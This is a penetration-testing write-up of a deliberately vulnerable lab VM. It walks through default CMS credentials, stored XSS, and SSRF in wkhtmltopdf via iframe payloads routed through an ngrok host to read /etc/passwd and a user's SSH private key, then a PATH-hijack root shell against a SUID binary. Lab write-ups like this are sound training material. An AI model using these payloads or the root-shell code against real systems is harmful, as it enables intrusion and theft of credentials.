# ITSTAR - Pentesting Methodology

As prepared, a vulnerable Debian (amd64) machine was built, deployed and was running in VMware.

![](https://i.ibb.co/kgVBc5L/image.png)



## Host discovery

![](<https://i.ibb.co/5rZ6jBK/image.png>)

The machine is configured to use **Bridge** so i will scan the subnet of my **eth0** .



![](<https://i.ibb.co/WcVNCV5/image.png>)

<center><b>sudo netdiscover -r 192.168.1.0/24</b></center>

The IP `192.168.1.113` definitely belongs to the machine so the next step is to gather information about the server, starting with port scanning.



## Information Gathering

![](<https://i.imgur.com/uMmXHkK.png>)

<center><b>nmap -sC -sV -oN machine.nmap -p- 192.168.1.113</b></center>

Scanning all TCP port resulted in port 22 (SSH) and 80 (Webserver) running. I will enumerate the webserver for more information about the server (which CMS is running, leftover files (backup) ),...



![](<https://i.imgur.com/G3fDB7r.png>)

Directory listing was enabled.



![](<https://i.imgur.com/jzL28G4.png>)

The website wasn't finished, so just had a **Login** function without **Register** function. I tried to fuzzing the login but all the tries were failed.



![](<https://i.imgur.com/s1scxNJ.png>)

The webserver generated itself a token for each time i login, so it's definitely not brute-force-able. And SQLi technique were also failed.

But the website left a detail which led to it was a custom open-source CMS (https://github.com/ionutvmi/master-login-system).



![](<https://i.imgur.com/JyxIwQK.png>)



After looking at the source code, i spotted in `install.php`, the author left pre-defined admin credential.

```php
$sqls[] = "
  INSERT INTO `".$prefix."users` (`userid`, `username`, `display_name`, `password`, `email`, `key`, `validated`, `groupid`, `lastactive`, `showavt`, `banned`, `regtime`) VALUES
(1, 'admin', 'Admin', '7110eda4d09e062aa5e4a390b0a572ac0d2c0220', 'admin@gmail.com', '', '1', 4, ".time().", 1, 0, ".time().");";
  foreach($sqls as $sql)
    if(!isset($page->error) && (!$db->query("?p",$sql)))
      $page->error = "There was a problem while executing <code>$sql</code>";
  if(!isset($page->error)) {
    $page->success = "The installation was successful ! Thank you for using master loging system and we hope you enjo it ! Have fun ! <br/><br/>
    <a class='btn btn-success' href='./index.php'>Start exploring</a>
    <br/><br/>
    <h3>USER: admin <br/> PASSWORD: 1234</h3>";
```

Which the default credential was `admin` - `1234`.

After logging in, there were 2 another function:

* Edit profile

* Export profile to PDF format




![](<https://i.imgur.com/VFJByH7.png>)



> Edit profile:

![](<https://i.imgur.com/Ad6I2YT.png>)

Information gathered:

* Username: limits characters `(Username too short or too long !)`
* Display name: doesn't limit the length of characters
* Emails: validates for email type

Due to no validation on `Display name`, i tested HTML Injection + XSS and they worked.

###### HTML Injection:



![](<https://i.imgur.com/heAf0p4.png>)



###### Stored XSS:



![](<https://i.imgur.com/bkR6uGn.png>)



> Export profile:

![](<https://i.imgur.com/s7oBOtl.png>)



The server returned a PDF object in response then the browser would read that object as a PDF file. It parsed everything in the HTML profile but i had to check how the server did it.

![](<https://i.imgur.com/iUOCeDy.png>)



The server used `wkhtmltopdf` as backend to convert HTML content into PDF object. With known software used + version i could search for the exploit.



![](<https://i.imgur.com/uy9J6fS.png>)



## Exploitation

Knowing that SSRF bug can give me local file access so i would try to read `/etc/passwd` using XSS with `iframe` + redirect the connection to the `/etc/passwd` file. But in order to control the inbound connection, i had to redirect the connection to whatever link or file i wanted. So i tried to redirect the connection to a specific website and export into the PDF so that the `iframe` will be included in.

Payload:

```html
<iframe width='800' height='2000' src='http://icanhazip.com'></iframe>
```



![](<https://i.imgur.com/2fLNwFN.png>)



It was successfully redirected. So now i need to read the `/etc/passwd` file. I had to redirect to the file using `file://` URL scheme.

> Building server:

![](<https://i.imgur.com/cRP3y3B.png>)



Payload:

```html
<iframe width='800' height='2000' src='http://469c2c15.ngrok.io/?f=/etc/passwd'></iframe>
```



Response:

![](<https://i.imgur.com/88x5WsL.png>)



So i was able to read the file, and i looked for "live" users to find their SSH private key (port 22 is open). Starting with user `gemini1`. I looked for the path `/home/gemini1/.ssh/ida_rsa`.



Payload:

```html
<iframe width='800' height='2000' src='http://469c2c15.ngrok.io/?f=/home/gemini1/.ssh/id_rsa'></iframe>
```



Response:

![](<https://i.imgur.com/WrGnL3R.png>)



## Privilege Escalation:

![](<https://i.imgur.com/mCmcvOi.png>)



Successfully logged in, i enumerated around to check for misconfigured files or leftover datas to escalate to `root` to fully control the server.

I was looking for some binary files which has SUID, SGID or Sticky bit permission in order to get root.



![](<https://i.imgur.com/UxuRSMN.png>)



There was a newest modified binary file which also had 4000 (SUID) permission.

> **SUID** (Set User ID) is a kind of permission given to a file. It will appear on the execution bit of the file owner's permission. When the file has such permission, the caller will temporarily obtain the permission of the owner of the file.

So i dumped the binary file to my local machine to do Reverse Engineering



![](<https://i.imgur.com/GIA2QQP.png>)



Started analyzing with Ghidra to get pseudo code.

![](<https://i.imgur.com/V69N2FG.png>)



As the flow the C code, the binary file called 4 processes, first 3 processes were called with specific path but not the last. I could spoof `date` binary file to spawn a shell as `root`. By doing this, i appended the home directory (`/home/gemini1/`) to the current $PATH as first element containing a compiled `date` file which calls `/bin/bash` as `root`.



> date.c

```c
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>

int main() {
  setuid(0);
  setgid(0);
  system("/bin/bash");
}
```



![](<https://i.imgur.com/t2y620y.png>)



> Appending path



![](<https://i.imgur.com/lFF1hSA.png>)



> Escalated as root



![](<https://i.imgur.com/qkXL3QG.png>)
